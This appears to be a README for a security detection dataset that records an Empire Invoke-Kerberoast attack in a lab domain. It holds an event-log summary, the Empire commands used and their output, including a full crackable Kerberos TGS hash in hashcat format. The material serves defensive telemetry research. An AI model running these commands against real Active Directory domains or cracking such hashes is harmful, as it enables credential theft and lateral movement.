# Empire Invoke-Kerberoast

During a Kerberoast attack, an adversary can use Domain credentials captured on any user to request Kerberos TGS tickets for accounts that are associated with the SPN records in Active Directory (AD). The TGS tickets are signed with the targeted user or services NTLM hash. This can then be cracked offline to retrieve the clear text password. By default, the tools to automate this process will retrieve the TGS ticket in the encrypted RC4 algorithm. 

## Technique(s) ID

T1208

## Creators

Jonathan Johnson [@jsecurity101](https://twitter.com/jsecurity101)

## Dataset

[empire_kerberoast.tar.gz](./empire_kerberoast.tar.gz)

## Network Environment

Shire

## Time Taken

2019-07-23025215

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             105 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Service Control Manager             |                                                        |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             104 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              40 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              28 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      |                                                        |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |            1269 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             396 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |             266 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             146 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              78 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               5 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               3 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |              90 |

## Attacker Activity

```
usemodule credentials/invoke_kerberoast
set domain shire.com
set OutputFormat Hashcat
execute
```

```
Job started: UA965R
[*] Valid results returned by 172.18.39.106
[*] Agent ENPLZ52T returned results.


TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*gandalf$shire.com$glamdring/shire.com*$7E5B69B9E3D5F6690CB7D7E18AD5F8CE$F37514C6949A
                       F284A4F74ACE9E7C20ED00E6E53D24FFA0B84F6D1D751B7CA006C14022DE8D974AF8869E5FF01ED2AE69D8AA7D578725A
                       D29B59B278FC76DE32F8426BE879FCAEC7173C2C00594C1F589B421BC05B136E8957A419838090A07DFE0EBC40ECBB970
                       63319BB983A364BF08E943CEC63E2BF929F007B623C78CF4492CB9AD2C086BA4F312A2C06C328B32992E4D668583E7401
                       55E2D5AD08DBF9A285F9F09B193B104D3567E5C465E1F7CE85CB9C778B50CF4748EC357158B0D4E172599703A6AC6C6E5
                       ED097B01512C6533E4356C8980DC496260F40D79D10360CE83C33C72250B0F2FDACB479499F6F8ADF096A8857BB081E98
                       BF2A5B8ACA19C179AEA785D5CEFCC867DCDC212103E2ED939918BFE8EC428F315BF736DFF5242894796FB36FC454F6250
                       4D4248C26673BF2BCC3AA9BFA40370C9AB409CABDF4E5884AF7EAFE4EF5CA8CD628C0C5DF1952B23D9799344A99AB7568
                       500DF946CAF1DCEF07B9EEDF5E47D0FC5FA61439F18BDC3443BC5A1F9D737EB2737AEC48B96E095054CCA6714AA72E3DF
                       480CD0BC9EE8F4E09FC89322CA07FEABDDD0A1C133408B82112AFA251C127C500734425E40061C331C749CCE9A3B48D92
                       A00671ED7F921179C2BE2F7290257215588CDC5CC6985F6AC0C728096A2E8EADD46A7B13D00AF4B7D0D1677994B0F3FD2
                       E9FDDD18877B8D57DDDCCB447111A06394FFCEC512EC47466C9096D8F4B0A4CDCC1E3B90EEC0B9E0D259E32AF7E5587D9
                       01B7CDDEFCF79BD4F722C1AE9EDC8B3082E10801237CAB6D8E5FC4C012AAB1A5EAF8DD61D89C3A3C6F4E93CAC207698F8
                       5AD012C19E3A2FA90192D4885BC0895A7E3E19DE7CAA2DC15F83D06015A576F557AB9301736B897E2DCD983489E89B292
                       C4EB740F9BFC10561E075A4EA2444E5A2E688211BC07DE4099E20351D3E99E4F64F9A7E60841379CCE3824C2973750C6B
                       47E28F63D5C10A4CCEA02540E44AD76BB18357387E81A588C6C38DFBE8C272CA94B9402F62C981ECAA0EC69EB65224668
                       CC8EA41B7C08FFC07354B68E13C6020FA58B152D6FCEAF5D0705F9C7EADEF7A047994DDEE3D7A33536F320287D30EC9FA
                       763C1F4FD8592A52C156A0F6D12FBB40DA7E758D865C4EC738D345AF790D4C26F4DD5E4193E2A488EF030C1921C2BF5D2
                       D7FD569FC707652B5491BFBC29E3D2804BFDB7B2849E7E2C5349277EAC4AEB7A5D86AFE0696885683920A1E10C8CAA1EC
                       61247B895A7D6044F50A4B33116D231ACC2B1BA49FB511659CFFE6C9C79BA8548A2044C0BB775C0B1EE8B85CE5A428E85
                       60160CAACADA20141A92B6FC4456BE7D0A56A5659FB07823BA106F939866807A57DCA7B985E29F9392CEA728856E9AB8F
                       619A1EAAF4B8540050520E1B49F208BF6C09B20F3E83E76BFA29457A1050DBCAB5D8B4FDAAEF64FCAE4C8667D132B259E
                       2C7D2E3DCF72BAAF2BB98
SamAccountName       : gandalf
DistinguishedName    : CN=Gandalf TheWhite,CN=Users,DC=shire,DC=com
ServicePrincipalName : glamdring/shire.com






Invoke-Kerberoast completed!
```